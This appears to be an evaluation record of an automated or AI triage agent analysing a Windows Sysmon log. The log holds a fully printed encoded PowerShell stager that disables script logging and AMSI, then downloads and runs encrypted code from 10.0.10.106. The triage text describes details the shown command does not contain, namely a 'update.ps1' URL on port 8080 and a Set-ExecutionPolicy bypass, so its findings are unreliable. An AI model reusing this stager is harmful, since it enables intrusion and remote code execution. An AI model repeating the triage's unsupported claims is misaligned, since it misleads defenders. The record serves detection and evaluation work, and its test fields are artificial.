    "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAcwBpAE8AbgAuAE0AYQBKAG8AUgAgAC0AZwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAHIARQBGAF0ALgBBAFMAUwBFAG0AQgBMAFkALgBHAGUAVABUAFkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAHQARgBpAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQAOABEAGEAQwAxACkAewAkADMAMgBlADQAZgA9ACQAOABkAGEAYwAxAC4ARwBFAFQAVgBBAEwAdQBFACgAJABOAFUAbABMACkAOwBJAEYAKAAkADMAMgBlADQAZgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBPAGwATABFAGMAdABJAE8AbgBTAC4ARwBFAG4AZQBSAEkAYwAuAEQASQBjAHQAaQBvAG4AYQBSAFkAWwBzAHQAcgBpAG4AZwAsAFMAeQBzAFQAZQBNAC4ATwBCAEoARQBDAFQAXQBdADoAOgBuAGUAdwAoACkAOwAkAHYAYQBsAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAQQBsAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAGUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAYQBMAH0ARQBsAHMAZQB7AFsAUwBDAHIAaQBQAFQAQgBsAE8AQwBLAF0ALgAiAEcARQBUAEYAaQBlAGAATABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AEUAKAAkAE4AdQBMAEwALAAoAE4ARQBXAC0ATwBiAGoARQBjAFQAIABDAE8AbABsAGUAYwB0AEkAbwBOAHMALgBHAEUATgBlAFIASQBjAC4ASABhAFMAaABTAEUAVABbAHMAdABSAEkAbgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBFAEYAXQAuAEEAUwBTAEUATQBCAEwAeQAuAEcAZQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIARQBGAC4ARwBFAFQARgBJAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEATABVAEUAKAAkAG4AVQBMAEwALAAkAHQAUgBVAEUAKQA7AH0AOwBbAFMAeQBzAHQARQBtAC4ATgBFAHQALgBTAGUAcgBWAGkAQwBlAFAAbwBpAE4AVABNAGEAbgBBAGcARQByAF0AOgA6AEUAeABwAGUAQwBUADEAMAAwAEMAbwBOAHQAaQBOAHUAZQA9ADAAOwAkADQAMwBFAEYAMwA9AE4AZQBXAC0ATwBCAGoARQBDAHQAIABTAHkAUwBUAGUATQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAEUARgAzAC4ASABFAGEARABlAHIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAEUAZgAzAC4ASABlAGEARABFAFIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUABSAE8AeABZAD0AWwBTAHkAcwB0AEUAbQAuAE4ARQB0AC4AVwBlAGIAUgBlAHEAVQBFAHMAVABdADoAOgBEAEUAZgBhAFUAbABUAFcARQBiAFAAcgBvAFgAWQA7ACQANAAzAEUAZgAzAC4AUABSAG8AeAB5AC4AQwByAGUARABFAG4AVABJAEEATABTACAAPQAgAFsAUwBZAHMAdABFAE0ALgBOAGUAdAAuAEMAUgBFAEQAZQBOAFQASQBhAGwAQwBBAGMAaABFAF0AOgA6AEQARQBmAEEAVQBMAFQATgBlAFQAVwBvAHIASwBDAFIAZQBkAEUATgBUAGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQARQB4AHQALgBFAE4AQwBvAEQASQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AFQAZQBzACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AVQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AYwBvAGQASQBOAGcAXQA6ADoAVQBuAEkAQwBPAEQARQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AEUAcgB0AF0AOgA6AEYAUgBPAG0AQgBBAHMARQA2ADQAUwBUAHIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQANAAzAGUARgAzAC4ASABlAEEAZABFAFIAUwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AFcAUgBHAEUAdQBHAFkARwBkAGQATQBaAFkAdgA1AGUAVABhAGsANgBtAG8ANwA4AEQAQwBBAD0AIgApADsAJABkAEEAdABBAD0AJAA0ADMAZQBGADMALgBEAE8AVwBOAGwAbwBhAEQARABBAHQAYQAoACQAcwBFAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABBAFsAMAAuAC4AMwBdADsAJABEAGEAVABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAGEAdABhAC4ATABFAE4ARwBUAGgAXQA7AC0AagBvAEkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAEEAVABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
    "event_id": "1",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "triage": {
      "summary": "An attacker executed an encoded PowerShell command on HR001.shire.com which downloaded and executed a remote script from http://10.0.10.106:8080/update.ps1. The decoded script contains obfuscated logic, attempts to bypass execution policies (Set-ExecutionPolicy Bypass), and uses IEX (Invoke-Expression) to run the content of the downloaded file directly in memory.",
      "technique": "T1059.001",
      "technique_name": "PowerShell",
      "confidence": 1.0,
      "disposition": "malicious_true_positive",
      "reasoning": "The ScriptBlockLogging (EventID 4104) clearly shows the use of 'IEX' to download and execute a script from an internal IP address. The command line also includes common evasion techniques like -noP (NoProfile), -sta, and -w 1 (WindowStyle Hidden).",
      "scope": {
        "systems": [
          "HR001.shire.com"
        ],
        "users": [
          "null"
        ],
        "data": "http://10.0.10.106:8080/update.ps1",
        "timeframe": "2019-05-14T22:51:21Z"
      },
      "escalate": true,
      "escalation_rationale": "Active execution of a remote script via encoded PowerShell is a high-confidence indicator of compromise. The script attempts to bypass security controls and execute code in memory.",
      "recommended_actions": [
        "Isolate HR001.shire.com from the network.",
        "Identify and investigate the source of the malicious script at 10.0.10.106.",
        "Perform a full forensic sweep of HR001 for persistence mechanisms (scheduled tasks, registry keys).",
        "Reset credentials for any accounts logged into HR001 during this timeframe."
      ],
      "queries_run": [
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE CommandLine LIKE '%-enc%' OR CommandLine LIKE '%-EncodedCommand%' LIMIT 20;",
        "SELECT TimeCreated, Computer, Channel, EventID, Image, CommandLine, ParentImage, ParentCommandLine, User\nFROM logs\nWHERE (CommandLine LIKE '%-enc%' OR CommandLine LIKE '%-EncodedCommand%')\n   OR EventID = 4104\nORDER BY TimeCreated ASC\nLIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine\nFROM logs\nWHERE Computer LIKE '%HR001.shire.com%'\n  AND EventID = 4104\n  AND TimeCreated BETWEEN '2019-05-14T22:50:00Z' AND '2019-05-14T22:53:00Z'\nLIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine, ScriptBlockText FROM logs WHERE EventID = 4104 AND Computer LIKE '%HR001.shire.com%' AND TimeCreated BETWEEN '2019-05-14T22:51:00Z' AND '2019-05-14T22:51:40Z' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer = 'HR001.shire.com' AND TimeCreated LIKE '2019-05-14T22:51:21%' AND Image LIKE '%powershell%' LIMIT 20;"
      ]
    },
    "fallback_used": false,
    "fallback_reason": null,
    "ground_truth_verdict": "bad",
    "evidence_trail": [
      {
        "question": "Can you provide the decoded content of the PowerShell -enc command and any subsequent script blocks or process executions triggered by it?",
        "evidence": "13 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:32:23.369Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": null, \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQ \u2026[truncated \u2014 ask for fewer columns or rows]"
      },
      {
        "question": "Can you provide the full decoded script from the PowerShell -enc command and any subsequent ScriptBlockLogging events?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-12T12:58:33.917Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:40.536Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:40.566Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:40.569Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:40.572Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:40.588Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:50.434Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:50.452Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:50.464Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:50.466Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:50.468Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:51.238Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:51.250Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:52.089Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, {\"TimeCreated\": \"2019-05-12T12:58:52.091Z\", \"Computer\": \"HFDC01.shire.com\", \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"EventID\": \"4104\", \"Image\": null, \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"User\": null}, 